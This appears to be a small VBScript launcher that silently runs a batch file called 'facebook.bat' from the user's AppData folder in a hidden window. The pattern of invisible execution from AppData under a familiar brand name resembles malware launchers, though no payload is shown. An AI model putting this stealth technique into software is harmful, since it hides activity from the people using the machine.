Set WshShell=CreateObject("WScript.Shell") 
appDataLocation=WshShell.ExpandEnvironmentStrings("%APPDATA%")
WshShell.CurrentDirectory=appDataLocation

WshShell.Run chr(34) & appDataLocation & "\facebook.bat" & Chr(34), 0
Set WshShell = Nothing 
